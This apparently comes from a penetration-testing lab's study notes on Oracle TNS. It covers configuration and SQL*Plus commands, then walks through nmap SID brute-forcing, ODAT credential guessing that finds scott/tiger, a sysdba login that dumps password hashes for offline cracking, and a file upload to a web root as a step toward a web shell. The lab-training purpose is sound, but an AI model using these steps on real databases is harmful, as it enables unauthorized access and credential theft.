# Oracle TNS
The Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle databases and applications over networks.
- https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html
- port 1521 can be changed 

## Configuration
- Oracle TNS can be remotely managed in Oracle 8i/9i but not in Oracle 10g/11g.
- The configuration files for Oracle TNS are called tnsnames.ora and listener.ora and are typically located in the $ORACLE_HOME/network/admin directory.
- Oracle 9 has a default password, CHANGE_ON_INSTALL, whereas Oracle 10 has no default password set
The Oracle DBSNMP service also uses a default password, dbsnmp that we should remember when we come across this one. Another example would be that many organizations still 
- use the finger service together with Oracle, which can put Oracle's service at risk and make it vulnerable when we have the required knowledge of a home directory.

### Settings 
| Setting            | Description                                                                                        |
|--------------------|----------------------------------------------------------------------------------------------------|
| DESCRIPTION        | A descriptor that provides a name for the database and its connection type.                        |
| ADDRESS            | The network address of the database, which includes the hostname and port number.                  |
| PROTOCOL           | The network protocol used for communication with the server.                                       |
| PORT               | The port number used for communication with the server.                                            |
| CONNECT_DATA       | Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier. |
| INSTANCE_NAME      | The name of the database instance the client wants to connect.                                     |
| SERVICE_NAME       | The name of the service that the client wants to connect to.                                       |
| SERVER             | The type of server used for the database connection, such as dedicated or shared.                 |
| USER               | The username used to authenticate with the database server.                                        |
| PASSWORD           | The password used to authenticate with the database server.                                        |
| SECURITY           | The type of security for the connection.                                                           |
| VALIDATE_CERT      | Whether to validate the certificate using SSL/TLS.                                                 |
| SSL_VERSION        | The version of SSL/TLS to use for the connection.                                                  |
| CONNECT_TIMEOUT    | The time limit in seconds for the client to establish a connection to the database.                |
| RECEIVE_TIMEOUT    | The time limit in seconds for the client to receive a response from the database.                  |
| SEND_TIMEOUT       | The time limit in seconds for the client to send a request to the database.                        |
| SQLNET.EXPIRE_TIME | The time limit in seconds for the client to detect a connection has failed.                        |
| TRACE_LEVEL        | The level of tracing for the database connection.                                                  |
| TRACE_DIRECTORY    | The directory where the trace files are stored.                                                    |
| TRACE_FILE_NAME    | The name of the trace file.                                                                        |
| LOG_FILE           | The file where the log information is stored.                                                      |


### Default Configuration
The default configuration of the Oracle TNS server varies depending on the version and edition of Oracle software installed. 

### Tnsnames.ora
https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007
```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

## CMDs 
| Database Operation                                                | SQL*Plus Command |
|-------------------------------------------------------------------|------------------|
| Log in to SQL*Plus                                                | `SQLPLUS [ [{username[/password][@connect_identifier] | / } [AS {SYSOPER | SYSDBA | SYSASM}][edition=value]] | /NOLOG ]` |
| List help topics available in SQL*Plus                            | `HELP [ INDEX | topic ]` |
| Execute host commands                                             | `HOST [ command ]` |
| Show SQL*Plus system variables or environment settings            | `SHOW { ALL | ERRORS | USER | system_variable [, system_variable] ...}` |
| Alter SQL*Plus system variables or environment settings           | `SET system_variable value` |
| Start up a database                                               | `STARTUP [ PFILE = filename ] [ MOUNT [ dbname ] | NOMOUNT ]` |
| Connect to a database                                             | `CONNECT [{username[/password] [@connect_identifier] | / | proxy_user [ username ] [/password] [@connect_identifier]} [AS {SYSOPER | SYSDBA | SYSASM}] [edition=value]]` |
| List column definitions for a table, view, or synonym, or specifications for a function or procedure | `DESCRIBE [ schema. ] object` |
| Edit contents of the SQL buffer or a file                         | `EDIT [ filename [ .ext ] ]` |
| Get a file and load its contents into the SQL buffer              | `GET filename [ .ext ] [ LIST | NOLLIST ]` |
| Save contents of the SQL buffer to a file                         | `SAVE filename [ .ext ] [ CREATE | REPLACE | APPEND ]` |
| List contents of the SQL buffer                                   | `LIST [ n | n m | n LAST ]` |
| Delete contents of the SQL buffer                                 | `DEL [ n | n m | n LAST ]` |
| Add new lines following current line in the SQL buffer            | `INPUT [ text ]` |
| Append text to end of current line in the SQL buffer              | `APPEND text` |
| Find and replace first occurrence of a text string in current line of the SQL buffer | `CHANGE sepchar old [ sepchar [ new [ sepchar ] ] ]` |
| Capture query results in a file and, optionally, send contents of file to default printer | `SPOOL [ filename [ .ext ]  [ CREATE | REPLACE | APPEND | OFF | OUT ]` |
| Run SQL*Plus statements stored in a file                          | `@ { url | filename [ .ext ] } [ arg ... ]START { url | filename [ .ext ] } [ arg ... ]` |
| Execute commands stored in the SQL buffer                         | `/` |
| List and execute commands stored in the SQL buffer                | `RUN` |
| Execute a single PL/SQL statement or run a stored procedure       | `EXECUTE statement` |
| Disconnect from a database                                        | `DISCONNECT` |
| Shut down a database                                              | `SHUTDOWN [ ABORT | IMMEDIATE | NORMAL ]` |
| Log out of SQL*Plus                                               | `{ EXIT | QUIT } [ SUCCESS | FAILURE | WARNING ] [ COMMIT | ROLLBACK ]` |

### Listener.ora
 listener.ora file is a server-side configuration file that defines the listener process's properties and parameters,
```txt
Code: txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

### PlsqlExclusionList
Oracle databases can be protected by using so-called PL/SQL Exclusion List (PlsqlExclusionList). It is a user-created text file that needs to be placed in the $ORACLE_HOME/sqldeveloper directory, 
and it contains the names of PL/SQL packages or types that should be excluded from execution. Once the PL/SQL Exclusion List file is created, it can be loaded into the database instance. It serves as a blacklist that cannot be accessed through the Oracle Application Server.


## Footprinting
### Nmap
```sh
sudo nmap -p1521 -sV 10.129.204.235 --open

sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute # brute force SID

```

### Oracle Database Attacking Tool setup.sh
Oracle tools setup script

```sh
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycrypto passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```
Check if installation was succesful:
```sh
/odat.py -h

usage: odat.py [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
               ...

            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
...SNIP...
```

In the following example, we find valid credentials for the user scott and his password tiger.
```sh
./odat.py all -s 10.129.119.183

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```

### Connecting with SQL Plus
#### Installation
```sh
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip && wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip && sudo mkdir -p /opt/oracle && sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip && sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip && cd /opt/oracle/instantclient_21_4 && find . -type f | sort && export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH && export PATH=$LD_LIBRARY_PATH:$PATH && source ~/.bashrc && sqlplus -V
```
#### Usage
```sh
sqlplus scott/tiger@10.129.119.183/XE

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 

#if sqlplus: deliver this: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory,
#than do this
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```
```sh
sqlplus scott/tiger@10.129.119.183/XE as sysdba 
# we can not add new users or make any modifications. From this point, we could retrieve the password hashes from the sys.user$ and try to crack them offline.

SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...

```

## Upload Files / Webschell can be possible with this:
Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:

OS	Path
- Linux	/var/www/html
- Windows	C:\inetpub\wwwroot

```shell 
 echo "Oracle File Upload Test" > testing.txt
detau@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt f
```